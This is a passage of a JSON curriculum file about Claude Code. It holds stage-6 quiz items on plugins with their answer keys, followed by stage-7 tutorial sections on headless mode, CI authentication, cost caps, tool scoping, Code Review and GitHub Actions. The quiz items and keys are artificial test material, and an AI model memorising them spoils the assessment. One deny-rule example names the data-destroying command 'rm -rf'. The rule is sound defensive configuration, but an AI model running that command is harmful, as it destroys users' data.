     "`strict: false` — the marketplace entry becomes the entire definition, and any `plugin.json` declaring components fails to load.",
     "`strict: true` — the marketplace entry overrides all fields in `plugin.json`.",
     "`defaultEnabled: false` — plugins load as disabled so the marketplace entry controls activation.",
     "`allowCrossMarketplaceDependenciesOn: []` — an empty list prevents `plugin.json` from declaring external dependencies."
    ],
    "correct": 0,
    "explanation": "The content states: '`strict` (default true): true → `plugin.json` is authority, marketplace entry supplements/merges. false → marketplace entry is the entire definition and any `plugin.json` declaring components fails to load (lets a marketplace operator curate without a plugin.json).' Option B reverses the meaning of `strict: true`. Option C is about default-disabled installation, not about who is the authoritative source. Option D is unrelated to plugin.json authority."
   },
   {
    "id": "stage-6-q12",
    "type": "multiple-choice",
    "prompt": "A plugin script references bundled helper binaries using the absolute path `/home/brian/.claude/plugins/my-plugin-1.2.3/bin/helper.sh`. After the next plugin update, the script breaks. What is the correct pattern?",
    "options": [
     "Use `${CLAUDE_PLUGIN_DATA}/bin/helper.sh` — the data directory persists across updates.",
     "Use `${CLAUDE_PLUGIN_ROOT}/bin/helper.sh` — the install dir is substituted correctly at runtime even though it changes on update.",
     "Use `${CLAUDE_PROJECT_DIR}/bin/helper.sh` — the project root is stable and should contain bundled executables.",
     "Use a relative path `./bin/helper.sh` — hooks always execute from the plugin root directory."
    ],
    "correct": 1,
    "explanation": "The content states: '`${CLAUDE_PLUGIN_ROOT}` — Absolute install dir — CHANGES on every update; reference bundled scripts/binaries via this, never absolute paths.' Using `${CLAUDE_PLUGIN_ROOT}` gives the correct current install dir at runtime, even as it changes. `${CLAUDE_PLUGIN_DATA}` (option A) is for persistent state like node_modules and venvs — not for bundled binaries that are part of the plugin source. `${CLAUDE_PROJECT_DIR}` (option C) is the user's project, not the plugin install. Relative paths (option D) depend on the working directory at execution time, which is not guaranteed to be the plugin root."
   },
   {
    "id": "stage-6-q13",
    "type": "multiple-choice",
    "prompt": "A CI pipeline needs to check whether any installed plugins have errors. Which command does the content recommend, and why?",
    "options": [
     "`/plugin list` in interactive mode — the 4-tab UI shows an Errors tab that is the canonical error source.",
     "`claude plugin list --json` and read each plugin's `errors` field — use this for CI rather than parsing human output.",
     "`claude plugin validate <name>` — validation mode returns a machine-readable exit code for CI gates.",
     "`claude plugin marketplace update` — refresh all sources first; error state is only accurate after an update."
    ],
    "correct": 1,
    "explanation": "The content explicitly says: 'Use `claude plugin list --json` (read each plugin's `errors` field) for CI/health checks rather than parsing human output.' The `/plugin` interactive UI (option A) is for human use, not CI. Option C (`validate`) is a valid subcommand but the content recommends `list --json` with the errors field for CI health checks specifically. Option D conflates marketplace source freshness with runtime error state."
   },
   {
    "id": "stage-6-q14",
    "type": "multiple-choice",
    "prompt": "A plugin agent frontmatter declares `permissionMode: restricted` to limit what it can do. Will this setting be honored?",
    "options": [
     "Yes — `permissionMode` is one of the supported frontmatter fields for plugin agents.",
     "No — `permissionMode` is not supported in plugin-shipped agents and is silently ignored.",
     "Only if the plugin is installed at managed scope — otherwise it is overridden by user settings.",
     "Yes, but only for agents declared with `isolation: worktree`."
    ],
    "correct": 1,
    "explanation": "The content states: 'For security, `hooks`, `mcpServers`, and `permissionMode` are NOT supported in plugin-shipped agents (silently ignored).' This is an explicit security policy. None of the other options correctly describe the behavior — managed scope (option C) affects read-only enforcement on settings, not agent frontmatter support; `isolation: worktree` (option D) is the only valid isolation value but is unrelated to whether `permissionMode` is honored."
   },
   {
    "id": "stage-6-q15",
    "type": "multi-select",
    "prompt": "A team is designing a plugin that will be always-on for all developers. Select ALL concerns the content says teams should actively budget or plan for with always-on plugins.",
    "options": [
     "Always-on token cost from non-deferred MCP servers invalidating the prompt cache.",
     "The marketplace catalog syncing nightly, which may delay availability of critical security updates.",
     "The `${CLAUDE_PLUGIN_DATA}` directory growing unbounded if the plugin installs dependencies without cleanup.",
     "The keychain's ~2KB total budget being consumed by plugin secrets, leaving insufficient space for OAuth tokens.",
     "Background monitors consuming resources because they run continuously and each stdout line is delivered to Claude as a notification."
    ],
    "correct": [
     0,
     3,
     4
    ],
    "explanation": "The content identifies: (A) 'always-on token cost is budgeted' and non-deferred MCP servers invalidate prompt cache (a reload-plugins warning exists specifically for this); (D) 'keychain has a ~2KB total budget shared with OAuth tokens, so keep secrets small'; (E) 'Monitors: each command runs while active and every stdout line is delivered to Claude as a notification' — active resource concern. Option B (nightly sync delay) is mentioned in the context of community approval, not as a plugin design concern for always-on plugins. Option C (`${CLAUDE_PLUGIN_DATA}` growth) is not raised as a concern in the content."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Plugins & distribution."
 },
 {
  "id": "stage-7",
  "stage": 7,
  "title": "Automation, CI & integrations",
  "summary": "Automation, CI & integrations: headless (print) mode, CI authentication, cost and loop bounding.",
  "prerequisites": [
   "stage-6"
  ],
  "objectives": [
   "Understand the concepts in Automation, CI & integrations."
  ],
  "definitions": [
   {
    "term": "headless (print) mode",
    "short": "Running Claude Code non-interactively with `claude -p` so it executes one query via the Agent SDK and exits, forming the basis for all scripting and automation."
   },
   {
    "term": "CI authentication",
    "short": "Authenticating unattended runs without interactive sign-in, choosing between subscription billing and Console API-usage billing."
   },
   {
    "term": "cost and loop bounding",
    "short": "Capping an automated run's agentic turns and dollar spend so a pipeline can't run away."
   },
   {
    "term": "tool and MCP scoping",
    "short": "Controlling which tools and MCP servers an automated agent can access, distinguishing auto-approval, removal-from-context, and call-level denial."
   },
   {
    "term": "managed Code Review service",
    "short": "A GitHub App service (Team/Enterprise plans) that posts inline PR review comments on configurable triggers, billed separately via usage credits and unable to approve or block on its own."
   },
   {
    "term": "REVIEW.md control file",
    "short": "A short repo-root file injected verbatim as highest-priority instructions into every managed review, used to tune what counts as a blocking finding."
   }
  ],
  "sections": [
   {
    "heading": "From Interactive to Headless: What -p Actually Does",
    "body": "The `-p` (equivalently `--print`) flag is the single switch that turns Claude Code from a conversational terminal app into a scriptable process. When you run `claude -p \"<prompt>\"`, the tool executes one complete agentic loop via the Agent SDK — reading files, calling tools, iterating — then writes its final response to stdout and exits with a zero status code (non-zero on failure). No TTY required, no readline, no spinner.\n\nThis is the mechanical foundation for every CI job, cron task, and pipeline step described in the rest of this stage.\n\n### What -p changes and what stays the same\n\nWith `-p`, all CLI flags remain valid — `--allowedTools`, `--max-turns`, `--output-format`, `--mcp-config`, `--system-prompt`, everything. The difference is purely behavioral: the process returns.\n\nWithout additional flags, `-p` still loads the same context an interactive session would: `CLAUDE.md` files up the directory tree, `~/.claude/settings.json`, project `.mcp.json`, hooks, skills, plugins. This is the \"context bleed\" problem in CI: a teammate's `~/.claude/` configuration, a local MCP server, or a hook registered in the repo can silently alter what your CI job does on different machines.\n\n### Bare mode: reproducible headless runs\n\nThe `--bare` flag eliminates context bleed. It skips auto-discovery of hooks, skills, plugins, MCP servers, auto-memory, and `CLAUDE.md` files. Only what you pass explicitly via CLI flags takes effect:\n\n```bash\nclaude --bare -p \"Summarize this diff\" \\\n  --allowedTools \"Read\" \\\n  --append-system-prompt-file ./ci-rules.txt\n```\n\nIn bare mode, Claude has access to Bash, file read, and file edit tools. Every other capability must be wired in explicitly. Note that bare mode skips OAuth and keychain reads — Anthropic authentication must come from `ANTHROPIC_API_KEY` or an `apiKeyHelper` in the JSON passed to `--settings`.\n\n```\n# Bare mode: what loads vs what doesn't\n--bare OFF (default)          --bare ON\n─────────────────────────     ─────────────────────────\nCLAUDE.md files       YES     NO (skipped)\n~/.claude/settings    YES     NO (skipped)\nProject .mcp.json     YES     NO (skipped)\nHooks                 YES     NO (skipped)\nSkills                YES     NO (skipped)\nPlugins               YES     NO (skipped)\nAuto-memory           YES     NO (skipped)\nOAuth/keychain auth   YES     NO (use ANTHROPIC_API_KEY)\nBash/Read/Edit tools  YES     YES (always available)\nFlags you pass        YES     YES (always honored)\n```\n\nThe docs note that `--bare` will become the default for `-p` in a future release. Treat it as the right default now for any CI invocation where you do not need repository-local customization.\n\n### Output formats\n\nPipe and redirect behavior depends on `--output-format`:\n\n| Format | What stdout contains | Use when |\n|---|---|---|\n| `text` (default) | Plain text response | Human-readable logs, shell pipelines |\n| `json` | JSON object with `result`, `session_id`, `total_cost_usd`, and per-model cost breakdown | Scripts that parse output or track spend |\n| `stream-json` | Newline-delimited JSON events as they arrive | Real-time token streaming, progress dashboards |\n\nThe `json` format is the right choice for most CI scripts: you get the response text in `.result`, a session ID for follow-up turns, and cost metadata without hitting a separate API:\n\n```bash\nresult=$(claude --bare -p \"Review this diff\" \\\n  --output-format json \\\n  --allowedTools \"Read\" \\\n  | jq -r '.result')\n```\n\nFor validated structured output, add `--json-schema` with a JSON Schema; the structured response lands in `.structured_output`.\n\nStdin is capped at 10 MB (as of v2.1.128). Larger inputs must go to a file and be referenced by path in the prompt."
   },
   {
    "heading": "CI Authentication: Two Billing Modes, One Decision",
    "body": "Interactive login uses a browser OAuth flow that is impossible in CI. There are two clean paths for unattended runs, and the choice is a billing decision as much as a technical one.\n\n### Path 1: Long-lived OAuth token (subscription billing)\n\nOn any Pro, Max, Team, or Enterprise plan, generate a one-year OAuth token on your developer workstation:\n\n```bash\nclaude setup-token\n```\n\nThe command walks through the OAuth authorization flow and prints the token to the terminal. It does not save the token anywhere — copy it immediately. Then set it as a secret in CI:\n\n```bash\nexport CLAUDE_CODE_OAUTH_TOKEN=your-token\n```\n\nThis token authenticates against your Claude subscription. It is scoped to inference only and cannot establish Remote Control sessions.\n\n**One important caveat:** `--bare` mode skips OAuth and keychain reads entirely. If your script passes `--bare`, authenticate with `ANTHROPIC_API_KEY` or an `apiKeyHelper` passed via `--settings` instead.\n\n### Path 2: API key (Console usage billing)\n\nFor teams on Console (API-usage billing) or anyone who wants per-token cost visibility separate from their subscription, set:\n\n```bash\nexport ANTHROPIC_API_KEY=sk-ant-...\n```\n\nIn non-interactive mode (`-p`), the key is always used when present — there is no per-session approval prompt as there is in interactive mode. In interactive mode there is a one-time approval prompt.\n\n### Authentication precedence\n\nWhen multiple credential sources are present, Claude Code resolves them in this order:\n\n| Priority | Source | When to use |\n|---|---|---|\n| 1 | Cloud provider env vars (`CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, `CLAUDE_CODE_USE_FOUNDRY`) | Bedrock / Vertex / Foundry infra |\n| 2 | `ANTHROPIC_AUTH_TOKEN` | LLM gateway / proxy (sent as `Authorization: Bearer`) |\n| 3 | `ANTHROPIC_API_KEY` | Direct Anthropic API, Console billing |\n| 4 | `apiKeyHelper` script output | Rotating credentials, vault-fetched tokens |\n| 5 | `CLAUDE_CODE_OAUTH_TOKEN` | CI pipelines, subscription billing, non-bare mode only |\n| 6 | Subscription OAuth credentials from `/login` | Interactive sessions only |\n\nThe `apiKeyHelper` setting in `settings.json` points to a shell script that returns a fresh key; Claude Code calls it after 5 minutes or on an HTTP 401 response. This is the right approach when your team rotates short-lived tokens from a secrets manager:\n\n```json\n{\n  \"apiKeyHelper\": \"/usr/local/bin/fetch-claude-key.sh\"\n}\n```\n\n### Billing mode comparison\n\n| | Subscription OAuth token | `ANTHROPIC_API_KEY` |\n|---|---|---|\n| Billing | Against subscription (seats) | Per token (Console invoice) |\n| Key rotation | Annual, manual re-run of `setup-token` | Standard key lifecycle |\n| Works in `--bare` mode | No — use `ANTHROPIC_API_KEY` in bare mode | Yes |\n| Works with Bedrock/Vertex/Foundry | No — replaced by cloud provider auth | No — replaced by cloud provider auth |\n| Cost visibility | Subscription lump sum | `total_cost_usd` in JSON output |\n\nFor most teams: Console API key in CI (per-token cost tracking, no seat sharing), subscription credentials for developers' local interactive sessions. Keep them separate so CI cost is visible on the invoice."
   },
   {
    "heading": "Bounding Agentic Runs: Turns and Budget Caps",
    "body": "An agentic run with no limits is a runaway cost event waiting to happen. A model that decides to explore the entire codebase before answering, or enters a retry loop on a failing tool, will happily consume many turns and dollars with no stopping signal. Two flags put hard walls on both dimensions, and both are only available in `-p` (print) mode.\n\n### --max-turns: limit the loop\n\n```bash\nclaude -p \"Fix the failing tests\" \\\n  --allowedTools \"Bash,Read,Edit\" \\\n  --max-turns 20\n```\n\nThe `--max-turns` flag limits the number of agentic turns. When the limit is reached, Claude Code exits with an error (non-zero status). There is no default — without this flag, the agent runs until it decides it is done.\n\n### --max-budget-usd: limit the spend\n\n```bash\nclaude -p \"Analyze this repo\" \\\n  --output-format json \\\n  --max-budget-usd 2.00\n```\n\nThe `--max-budget-usd` flag stops the run before it crosses a dollar threshold. Claude Code checks the running cost before each new turn and aborts if continuing would exceed the budget. This is the safety net for tasks where you cannot predict turn count but can bound cost.\n\n### Combining both\n\nSet both for defense-in-depth. A task that spawns a large number of short turns hits `--max-turns` first; a task that makes a few very expensive calls hits `--max-budget-usd` first:\n\n```bash\nclaude --bare -p \"$PROMPT\" \\\n  --max-turns 30 \\\n  --max-budget-usd 5.00 \\\n  --output-format json \\\n  --allowedTools \"Bash(git *),Read,Edit\"\n```\n\n### Tracking cost in CI\n\nWith `--output-format json`, the response includes `total_cost_usd` and a per-model cost breakdown. Log this in every CI run so you can trend it over time:\n\n```bash\nresponse=$(claude --bare -p \"$PROMPT\" --output-format json ...)\ncost=$(echo \"$response\" | jq -r '.total_cost_usd')\necho \"[claude] task_cost=${cost}\" >> \"$GITHUB_STEP_SUMMARY\"\n```\n\n### Timeouts at the workflow level\n\nFor GitHub Actions, also set a `timeout-minutes` on the job or step. This guards against edge cases where Claude Code itself gets stuck before or between turns:\n\n```yaml\njobs:\n  claude:\n    timeout-minutes: 15\n    steps:\n      - uses: anthropics/claude-code-action@v1\n        with:\n          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}\n          claude_args: \"--max-turns 20 --max-budget-usd 3.00\"\n```\n\n### Spend cap for the managed Code Review service\n\nFor the managed GitHub Code Review service (separate from `claude -p` scripts), set a monthly spend cap at `claude.ai/admin-settings/usage`. This caps total Code Review spend across all PRs for the organization."
   },
   {
    "heading": "Tool and MCP Scoping: Three Distinct Mechanisms",
    "body": "Automations need a narrower tool surface than interactive sessions. Giving a CI script the same tool access as a developer at a keyboard is a security and reliability problem: an unexpected tool call can modify unintended files, make network requests, or trigger external side effects. Claude Code provides three orthogonal mechanisms to control this, and conflating them causes mistakes.\n\n### Mechanism 1: --tools — restrict which built-in tools are available\n\n`--tools` restricts which built-in tools Claude can use. Pass a comma-separated list of tool names, `\"\"` to disable all built-in tools, or `\"default\"` for all.\n\n```bash\n# Give Claude only Bash and Read capabilities, no file editing\nclaude -p \"Summarize the test results\" --tools \"Bash,Read\"\n\n# Disable all built-in tools (model answers from context only)\nclaude -p \"Answer from your training\" --tools \"\"\n```\n\nMCP tools are not affected by `--tools`. To deny MCP tools as well, use `--disallowedTools \"mcp__*\"`, or pass `--strict-mcp-config` without `--mcp-config` so no MCP servers load at all.\n\n### Mechanism 2: --allowedTools — auto-approve without prompting\n\n`--allowedTools` does not restrict access — it grants pre-approval for specific calls so the agent does not pause and wait for human confirmation. In `-p` mode there is no human to confirm, so any unapproved tool call that requires a permission prompt will abort the run. Pre-approve everything the task legitimately needs:\n\n```bash\nclaude -p \"Run tests and commit the fixes\" \\\n  --allowedTools \\\n    \"Bash(npm test *)\" \\\n    \"Bash(git add *)\" \\\n    \"Bash(git commit *)\" \\\n    \"Read\" \\\n    \"Edit\"\n```\n\nThe trailing space-plus-asterisk pattern (`Bash(npm test *)`) uses prefix matching with a word boundary. `Bash(npm test*)` (no space before `*`) would also match `npm testing`, which is probably not intended. `--allowed-tools` is an accepted alias.\n\n### Mechanism 3: --disallowedTools — call-level denial\n\n`--disallowedTools` blocks specific calls. A bare tool name removes the tool from the model's context entirely; a scoped pattern blocks matching calls while leaving the tool available for other patterns:\n\n```bash\n# Remove all MCP tools from context\nclaude -p \"$PROMPT\" --disallowedTools \"mcp__*\"\n\n# Remove every tool from context\nclaude -p \"$PROMPT\" --disallowedTools \"*\"\n\n# Leave Bash available but block destructive remove calls\nclaude -p \"$PROMPT\" --disallowedTools \"Bash(rm -rf *)\"\n```\n\nFor persistent deny rules shared across the team, use `permissions.deny` in `.claude/settings.json` rather than per-invocation flags. `--disallowed-tools` is an accepted alias.\n\n### MCP tool naming convention\n\nMCP tools are named `mcp__<server>__<tool>`. A server named `github` with a `create_pr` tool is `mcp__github__create_pr`. Permission rules in `settings.json` use the same naming:\n\n```json\n{\n  \"permissions\": {\n    \"allow\": [\"mcp__github__get_*\"],\n    \"deny\": [\"mcp__github__create_*\", \"mcp__github__delete_*\"]\n  }\n}\n```\n\n`mcp__*` as a deny rule removes all MCP tools from context.\n\n### Isolating MCP entirely with --strict-mcp-config\n\nFor CI jobs that need a specific MCP server and nothing else, combine `--mcp-config` with `--strict-mcp-config`:\n\n```bash\nclaude --bare -p \"$PROMPT\" \\\n  --mcp-config ./ci-mcp.json \\\n  --strict-mcp-config\n```\n\n`--strict-mcp-config` tells Claude Code to ignore all other MCP configurations — the project's `.mcp.json`, the user's `~/.claude.json`, and any ambient MCP servers. Only what is in `./ci-mcp.json` loads. This is the correct approach when you want a CI job to have exactly one MCP server and no ambient servers from developers' machines.\n\n### Summary: which mechanism to use\n\n| Goal | Mechanism |\n|---|---|\n| Model should not know a built-in tool exists | `--tools \"ToolA,ToolB\"` (allowlist) or bare-name `--disallowedTools \"ToolName\"` |\n| Model can use tool, no human approval needed | `--allowedTools \"Tool(pattern)\"` |\n| Model can see tool, but specific calls blocked | Scoped `--disallowedTools \"Tool(pattern)\"` or `permissions.deny` in settings |\n| Remove all MCP tools | `--disallowedTools \"mcp__*\"` or `--strict-mcp-config` without `--mcp-config` |\n| Load exactly one MCP server, nothing else | `--mcp-config <file> --strict-mcp-config` |\n| Persistent rules shared across the team | `.claude/settings.json` `permissions.allow/deny` |\n| Org-wide non-overridable rules | Managed settings `permissions` block |"
   },
   {
    "heading": "Managed Code Review Service: What It Is and Is Not",
    "body": "The managed Code Review service is a GitHub App integration, available in research preview on Team and Enterprise plans, that posts inline review comments on pull requests. It is architecturally distinct from running `claude -p` in GitHub Actions — it runs on Anthropic infrastructure, not on your runners.\n\n### How it works\n\nWhen a review runs, multiple specialized agents analyze the PR diff and surrounding codebase in parallel on Anthropic's infrastructure. Each agent looks for a different class of issue. A verification step then checks candidates against actual code behavior to filter false positives. Results are deduplicated, ranked by severity, and posted as inline comments on the specific lines where issues were found, with a summary in the review body. Reviews scale with PR size and complexity and complete in about 20 minutes on average.\n\nIf no issues are found, Code Review updates the GitHub check run to show that no issues were detected.\n\n### What it can and cannot do\n\n| Capability | Status |\n|---|---|\n| Post inline comments on specific diff lines | Yes |\n| Approve a PR | No — never posts an approving review |\n| Block merge via branch protection | No — check run always completes with a neutral conclusion |\n| Gate merges via your own CI reading check run output | Yes — parse severity counts from the check run |\n| Respond to replies on its comments | No — replying does nothing; fix the code and push |\n| Run on push-triggered mode | Yes — if the repository is configured for it |\n| Run on draft PRs automatically | No — manual `@claude review` triggers do work on drafts |\n\nThe check run always completes with a neutral conclusion. If you want to gate merges on Code Review findings, read the severity breakdown from the check run's output in your own CI. The last line of the Details text is machine-readable:\n\n```bash\ngh api repos/OWNER/REPO/check-runs/CHECK_RUN_ID \\\n  --jq '.output.text | split(\"bughunter-severity: \")[1] | split(\" -->\")[0] | fromjson'\n# Returns: {\"normal\": 2, \"nit\": 1, \"pre_existing\": 0}\n# \"normal\" = count of Important findings\n```\n\n### Severity levels\n\n| Marker | Level | Meaning |\n|---|---|---|\n| 🔴 | Important | A bug that should be fixed before merging |\n| 🟡 | Nit | A minor issue, worth fixing but not blocking |\n| 🟣 | Pre-existing | A bug that exists in the codebase but was not introduced by this PR |\n\nEach finding includes a collapsible extended reasoning section explaining why Claude flagged the issue and how it verified the problem.\n\n### Trigger modes per repository\n\n| Mode | When review runs | Best for |\n|---|---|---|\n| Once after PR creation | Once when a PR opens or is marked ready for review | Stable workflows, lower cost |\n| After every push | On each push to the PR branch | Teams that want continuous feedback; resolved threads auto-close when fixes land |\n| Manual | Only on explicit `@claude review` or `@claude review once` comment | High-traffic repos, opt-in per PR |\n\nAdmins configure trigger mode per repository from `claude.ai/admin-settings/claude-code`.\n\n### Billing\n\nCode Review is billed via usage credits, billed separately from your plan's included usage. Each review averages $15–25, scaling with PR size and codebase complexity. Set a monthly spend cap at `claude.ai/admin-settings/usage`.\n\nCode Review is not available for organizations with Zero Data Retention (ZDR) enabled.\n\n### Manual triggers\n\n| Comment | Effect |\n|---|---|\n| `@claude review` | Starts a review AND subscribes the PR to push-triggered reviews going forward |\n| `@claude review once` | Starts a single review, does not subscribe the PR to future push reviews |\n\nPost these as top-level PR comments (not inline on a diff line), with the command at the start of the comment. You must have owner, member, or collaborator access. `@claude` (not `/claude`) is the trigger. Manual triggers also work on draft PRs, since an explicit request signals intent."
   },
   {
    "heading": "REVIEW.md: Highest-Priority Instructions for Every Code Review Agent",
    "body": "The managed Code Review service reads two files from your repository: `CLAUDE.md` and `REVIEW.md`. They differ in scope and how strongly they influence behavior.\n\n`CLAUDE.md` is read as project context across all Claude Code tasks. Newly introduced violations of `CLAUDE.md` rules are flagged as nits in Code Review — and if a PR change makes a `CLAUDE.md` statement outdated, Claude flags that the docs need updating too. `CLAUDE.md` files are hierarchical: a subdirectory's `CLAUDE.md` applies only to files under that path.\n\n`REVIEW.md` is review-only. Its contents are injected verbatim into the system prompt of every agent in the review pipeline as the highest-priority instruction block, taking precedence over the default review guidance.\n\n### What REVIEW.md can do\n\n**Redefine severity.** The default calibration targets production code. A docs repo or a prototype has a different bar. State explicitly what counts as Important versus Nit at most:\n\n```markdown\n## What Important means here\nReserve Important for findings that would break behavior, leak data,\nor block a rollback: incorrect logic, unscoped DB queries, PII in logs\nor error messages, migrations that aren't backward compatible.\nStyle and naming are Nit at most.\n```\n\n**Cap nit volume.** A long PR touching prose files can accumulate many style nits. Cap them:\n\n```markdown\n## Cap the nits\nReport at most five Nit comments per review. If you found more,\nsay \"plus N similar items\" in the summary.\n```\n\n**Skip paths and categories.** Generated code, lockfiles, vendored dependencies, and anything CI already enforces:\n\n```markdown\n## Do not report\n- Anything CI already enforces: lint, formatting, type errors\n- Generated files under src/gen/ and any *.lock file\n- Test-only code that intentionally violates production rules\n```\n\n**Add repo-specific checks.** Rules that should fire on every PR for your domain:\n\n```markdown\n## Always check\n- New API routes have an integration test\n- Log lines don't include email addresses, user IDs, or request bodies\n- Database queries are scoped to the caller's tenant\n```\n\n**Control re-review behavior.** After multiple review rounds, suppress nits:\n\n```markdown\n## Re-review convergence\nAfter the first review, suppress new nits and post Important findings only.\n```\n\n### What REVIEW.md cannot do\n\n- `@` import syntax is not expanded. Referenced files are not read into the prompt. Put rules directly in the file.\n- It cannot make the service approve or block PRs — that constraint is architectural.\n- It cannot control which reviewers are notified, branch protection rules, or any GitHub metadata outside comments.\n\n### CLAUDE.md vs REVIEW.md\n\n| | `CLAUDE.md` | `REVIEW.md` |\n|---|---|---|\n| Scope | All Claude Code tasks | Managed Code Review only |\n| How injected | Read as project context | Injected as highest-priority system prompt block |\n| Violation severity in reviews | Nit | Whatever you define |\n| Per-subdirectory support | Yes — hierarchical | No — repo root only, flat |\n| `@` imports expanded | Yes | No |\n| Use for | Project conventions, running cast, style | Review calibration, skip rules, severity policy |\n\n### Keep REVIEW.md focused\n\nLength has a cost: a long `REVIEW.md` dilutes the rules that matter most. Keep it to instructions that change review behavior. Leave general project context in `CLAUDE.md`."
   },
   {
    "heading": "GitHub Actions Integration: anthropics/claude-code-action@v1",
    "body": "The `anthropics/claude-code-action@v1` action wraps Claude Code's Agent SDK for use in GitHub-hosted CI. It handles process lifecycle, authentication plumbing, and GitHub API interactions (reading issue/PR context, posting comments, pushing commits) that you would otherwise wire manually.\n\n### How it auto-detects mode\n\nThe v1 action auto-detects its operating mode based on what you configure:\n- If `prompt` is set and the trigger is a schedule or non-comment event, it runs immediately with that prompt (automation mode).\n- If `prompt` is omitted and the trigger is a comment event, it listens for the trigger phrase (default: `@claude`) and responds to it (interactive mode).\n\n### Minimal setup\n\nThe easiest way to set up the action is to run `/install-github-app` inside an interactive Claude Code terminal session. For manual setup:\n\n1. Install the Claude GitHub App at `https://github.com/apps/claude` (requires Contents, Issues, Pull requests: Read & Write).\n2. Add `ANTHROPIC_API_KEY` to your repository secrets.\n3. Create a workflow file:\n\n```yaml\n# .github/workflows/claude.yml\nname: Claude Code\non:\n  issue_comment:\n    types: [created]\n  pull_request_review_comment:\n    types: [created]\n\njobs:\n  claude:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      pull-requests: write\n      issues: write\n    steps:\n      - uses: anthropics/claude-code-action@v1\n        with:\n          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}\n          # Responds to @claude mentions — no prompt needed\n```\n\n### Triggering on a schedule with a prompt\n\n```yaml\nname: Daily Commit Summary\non:\n  schedule:\n    - cron: \"0 9 * * 1-5\"\n\njobs:\n  summary:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@v4\n      - uses: anthropics/claude-code-action@v1\n        with:\n          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}\n          prompt: \"Summarize commits from the last 24 hours and post as a PR comment\"\n          claude_args: \"--max-turns 10 --model claude-sonnet-4-6\"\n```\n\n### Passing CLI arguments\n\nAll Claude Code CLI flags go through `claude_args`. This is a string — use spaces or multiline YAML:\n\n```yaml\nclaude_args: |\n  --max-turns 15\n  --max-budget-usd 3.00\n  --allowedTools Bash(git *),Read,Edit\n  --append-system-prompt \"Follow our TypeScript conventions\"\n  --model claude-sonnet-4-6\n```\n\n### Action parameter reference\n\n| Parameter | Required | Description |\n|---|---|---|\n| `anthropic_api_key` | Yes (direct API only) | API key from Console; not needed for Bedrock/Vertex |\n| `prompt` | No | Instructions for Claude (plain text or a skill invocation) |\n| `claude_args` | No | Any Claude Code CLI flags |\n| `plugins` | No | Plugin names to install (newline-separated) |\n| `plugin_marketplaces` | No | Git URLs for plugin marketplaces (newline-separated) |\n| `github_token` | No | GitHub token for API access (uses default GITHUB_TOKEN if omitted) |\n| `trigger_phrase` | No | Custom trigger phrase (default: `@claude`) |\n| `use_bedrock` | No | `\"true\"` to use Amazon Bedrock |\n| `use_vertex` | No | `\"true\"` to use Google Vertex AI |\n\n### Bedrock and Vertex for enterprise environments\n\nFor organizations that need data residency control or want Claude on their own cloud billing, configure OIDC-based authentication (no static credentials):\n\n**Bedrock** — use OIDC IAM authentication. A custom GitHub App is recommended when using third-party providers:\n```yaml\n- name: Generate GitHub App token\n  id: app-token\n  uses: actions/create-github-app-token@v2\n  with:\n    app-id: ${{ secrets.APP_ID }}\n    private-key: ${{ secrets.APP_PRIVATE_KEY }}\n\n- name: Configure AWS Credentials\n  uses: aws-actions/configure-aws-credentials@v4\n  with:\n    role-to-assume: ${{ secrets.AWS_ROLE_TO_ASSUME }}\n    aws-region: us-west-2\n\n- uses: anthropics/claude-code-action@v1\n  with:\n    use_bedrock: \"true\"\n    github_token: ${{ steps.app-token.outputs.token }}\n    claude_args: \"--model us.anthropic.claude-sonnet-4-6 --max-turns 10\"\n```\n\nNote the `us.` region prefix in the Bedrock model ID — Bedrock model IDs differ from direct API IDs.\n\n**Vertex** — use Workload Identity Federation:\n```yaml\n- name: Generate GitHub App token\n  id: app-token\n  uses: actions/create-github-app-token@v2\n  with:\n    app-id: ${{ secrets.APP_ID }}\n    private-key: ${{ secrets.APP_PRIVATE_KEY }}\n\n- uses: google-github-actions/auth@v2\n  id: auth\n  with:\n    workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}\n    service_account: ${{ secrets.GCP_SERVICE_ACCOUNT }}\n\n- uses: anthropics/claude-code-action@v1\n  with:\n    use_vertex: \"true\"\n    github_token: ${{ steps.app-token.outputs.token }}\n    claude_args: \"--model claude-sonnet-4-5@20250929 --max-turns 10\"\n  env:\n    ANTHROPIC_VERTEX_PROJECT_ID: ${{ steps.auth.outputs.project_id }}\n    CLOUD_ML_REGION: us-east5\n```\n\n### Custom GitHub App vs default Anthropic App\n\nThe action uses the official Anthropic GitHub App (`github.com/apps/claude`) by default for direct API users — this is the simplest setup. For Bedrock or Vertex deployments, or for a branded username on commits and comments, create your own GitHub App and use `actions/create-github-app-token` to generate a token, then pass it as `github_token`.\n\nThe App requires: Contents read/write, Issues read/write, Pull requests read/write.\n\n### Common pitfall: Claude's commits not triggering CI\n\nGitHub Actions does not trigger workflows for commits made by `GITHUB_TOKEN`. Commits made by a GitHub App (including the Anthropic App) do trigger CI, which is the primary reason to prefer an App token over raw `GITHUB_TOKEN` for this integration."
   },
   {
    "heading": "System Prompt Layering vs Replacement: Which to Choose",
    "body": "Claude Code has four flags for customizing the system prompt, and the choice between append and replace determines whether you own the safety and capability layer or inherit it.\n\n### The four flags\n\n| Flag | Behavior |\n|---|---|\n| `--append-system-prompt` | Appends text to the end of the default system prompt |\n| `--append-system-prompt-file` | Appends file contents to the end of the default system prompt |\n| `--system-prompt` | Replaces the entire default prompt with inline text |\n| `--system-prompt-file` | Replaces the entire default prompt with file contents |\n\n`--system-prompt` and `--system-prompt-file` are mutually exclusive. The append flags can be combined with either replacement flag. All four work in both interactive and non-interactive modes.\n\n### What the default system prompt contains\n\nThe default system prompt is the full Claude Code identity: coding assistant role, tool guidance (how and when to use Bash, Edit, Read, etc.), safety instructions, and coding conventions. When you replace it, none of that loads — you take responsibility for whatever your task still needs.\n\n### Append: the right default for most CI tasks\n\nUse `--append-system-prompt` when Claude should remain a coding assistant that also follows your extra rules. This is correct for:\n- Per-invocation context (`--append-system-prompt \"This repo uses Bun, not npm\"`)\n- Style conventions that supplement rather than replace standard coding behavior\n- Domain context for a `-p` script that still uses standard tools\n\n```bash\ngh pr diff 